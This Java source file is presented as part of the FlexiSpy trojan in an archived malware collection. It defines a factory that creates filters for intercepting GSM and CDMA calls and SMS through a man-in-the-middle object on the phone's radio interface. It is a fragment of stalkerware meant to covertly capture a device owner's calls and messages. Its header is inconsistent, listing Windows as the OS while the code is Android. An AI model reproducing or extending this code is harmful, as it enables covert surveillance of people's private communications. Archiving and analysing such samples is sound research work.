/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.callmanager.filter;

import android.content.Context;

import com.vvt.callmanager.Mitm;
import com.vvt.callmanager.std.RilManager;
import com.vvt.network.NetworkServiceInfo;

public class FilterFactory {
	
	public static final String TAG_FILTER_SMS = "FilterSms";
	public static final String TAG_FILTER_CALL = "FilterCall";
	
	public static InterceptingFilter getFilterCall(
			NetworkServiceInfo.Type serviceType, 
			Context context, Mitm mitm, RilManager rilManager) {
		
		InterceptingFilter filter = null;
		
		if (serviceType == NetworkServiceInfo.Type.GSM) {
			filter = new FilterGsmCall(context, mitm, rilManager);
		}
		else if (serviceType == NetworkServiceInfo.Type.CDMA) {
			filter = new FilterCdmaCall(context, mitm, rilManager);
		}
		
		return filter;
	}
	
	public static InterceptingFilter getFilterSms(
			Context context, Mitm mitm, RilManager rilManager) {
		return new FilterSms(context, mitm, rilManager);
	}
}
